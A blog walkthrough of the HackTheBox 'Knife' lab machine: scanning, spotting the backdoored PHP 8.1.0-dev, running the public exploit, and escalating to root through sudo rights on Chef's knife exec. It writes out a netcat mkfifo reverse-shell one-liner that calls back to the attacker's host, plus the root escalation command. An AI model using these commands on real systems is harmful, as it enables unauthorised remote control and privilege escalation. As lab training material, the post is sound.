---
title: "Walk-through of Knife from HackTheBox"
header:
  teaser: /assets/images/2021-09-19-22-50-03.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - 8.1.0-dev
  - Chef
  - Knife
---

## Machine Information

![knife](/assets/images/2021-09-19-22-50-03.png)

Knife is rated as an easy machine on HackTheBox. An initial scan reveals a simple website running on port 80. Examining headers we discover it's running on a backdoored version of PHP. Using a public exploit we get an initial shell. From there we move to a more useable reverse shell, and enurmeration finds sudo privleges for Knife. We use this Chef command line tool to escalate to root to complete the box.

<!--more-->

Skills required are basic enumeration knowledge and researching exploits. Skills learned are exploiting vulnerable software and using Knife for escalation of privleges.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Knife](https://www.hackthebox.eu/home/machines/profile/347) |
| Machine Release Date | 22nd May 2021 |
| Date I Completed It | 20th September 2021 |
| Distribution Used | Kali 2021.2 – [Release Info](https://www.kali.org/blog/kali-linux-2021-2-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/knife]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.242 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/knife]
└─# nmap -p$ports -sC -sV -oA knife 10.10.10.242
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-19 22:54 BST
Nmap scan report for 10.10.10.242
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We find just two open ports, with ssh on 22 a no go for now. Let's see what's running on Apache on port 80:

![knife-website](/assets/images/2021-09-19-22-56-59.png)

A simple web page is all that's here. With nothing in the source code I used cURL to check the headers:

```text
┌──(root💀kali)-[~/htb/knife]
└─# curl -v http://10.10.10.242
*   Trying 10.10.10.242:80...
* Connected to 10.10.10.242 (10.10.10.242) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.242
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sun, 19 Sep 2021 21:55:41 GMT
< Server: Apache/2.4.41 (Ubuntu)
< X-Powered-By: PHP/8.1.0-dev
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
```

Note in the response we see X-Powered-By. A good explanation of headers in general is [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) on the Mozilla dev site. For X-Powered-By it says:

```text
X-Powered-By
May be set by hosting environments or other frameworks and contains information about them while not providing any usefulness to the application or its visitors. Unset this header to avoid exposing potential vulnerabilities.
```

I'm wondering why this site would be running a dev version of PHP, looking on exploit-db I find the answer [here](https://www.exploit-db.com/exploits/49933):

```text
An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
```

## PHP Exploit

So this site is running a backdoored version of PHP, let's grab the exploit and try it:

```text
┌──(root💀kali)-[~/htb/knife]
└─# searchsploit 8.1.0-dev
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution            | php/webapps/49933.py
--------------------------------------------------------------- ---------------------------------

┌──(root💀kali)-[~/htb/knife]
└─# searchsploit -m php/webapps/49933.py
  Exploit: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49933
     Path: /usr/share/exploitdb/exploits/php/webapps/49933.py
File Type: Python script, ASCII text executable
Copied to: /root/htb/knife/49933.py
                         
┌──(root💀kali)-[~/htb/knife]
└─# python3 ./49933.py
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$
```

## User Flag

That was nice and easy to get a basic shell. Let's have a quick look around:

```text
$ whoami
james

$ pwd
/

$ ls -l
lrwxrwxrwx   1 root root     7 Feb  1  2021 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Jul 23 13:37 boot
drwxr-xr-x   2 root root  4096 May  6 14:10 cdrom
drwxr-xr-x  19 root root  4020 Sep 20 09:01 dev
drwxr-xr-x  99 root root  4096 May 18 13:25 etc
drwxr-xr-x   3 root root  4096 May  6 14:44 home
<SNIP>
drwxr-xr-x   2 root root  4096 Feb  1  2021 srv
dr-xr-xr-x  13 root root     0 Sep 20 09:01 sys
drwxrwxrwt  17 root root 12288 Sep 20 19:25 tmp
drwxr-xr-x  15 root root  4096 May 18 13:20 usr
drwxr-xr-x  14 root root  4096 May  9 04:22 var

$ cat /home/james/user.txt
<HIDDEN>
```

I'm connected as the user James so I've grabbed the flag, now let's start a netcat listener in another terminal and connect to it to get a proper shell:

```text
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.211 4444 >/tmp/f
```

Switch to my waiting nc session to see we're connected:

```text
┌──(root💀kali)-[~/htb/knife]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.211] from (UNKNOWN) [10.10.10.242] 50628
/bin/sh: 0: can't access tty; job control turned off
$
```

## Privilege Escalation

I had a quick look around but one of the first things to check is sudo rights, which was the right path for this box:

```text
$ sudo -l 
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

I'd not heard of knife before, but running it reveals more:

```text
$ sudo /usr/bin/knife
ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)

Usage: knife sub-command (options)
    -s, --server-url URL             Chef Infra Server URL.
        --chef-zero-host HOST        Host to start Chef Infra Zero on.
        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.
    -k, --key KEY                    Chef Infra Server API client key.
        --[no-]color                 Use colored output, defaults to enabled.
    -c, --config CONFIG              The configuration file to use.
        --config-option OPTION=VALUE Override a single configuration option.
```

Knife is a command line tool for Chef which is an automation platform. From the Chef site [here](https://docs.chef.io/platform_overview/):

```text
Chef Infra is a powerful automation platform that transforms infrastructure into code. Whether you’re operating in the cloud, on-premises, or in a hybrid environment, Chef Infra automates how infrastructure is configured, deployed, and managed across your network, no matter its size.
```

## Root Flag

A look around the docs I found [this](https://docs.chef.io/workstation/knife_exec) which shows how to use knife to execute Ruby scripts. I also found [this](https://manned.org/knife-exec/dd85a3df) which shows you can also use it to run commands. So privilege escalation is trivial with our sudo permissions:

```text
$ sudo knife exec --exec "exec '/bin/sh -i'"
/bin/sh: 0: can't access tty; job control turned off
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
<HIDDEN>
```

All done. See you next time.
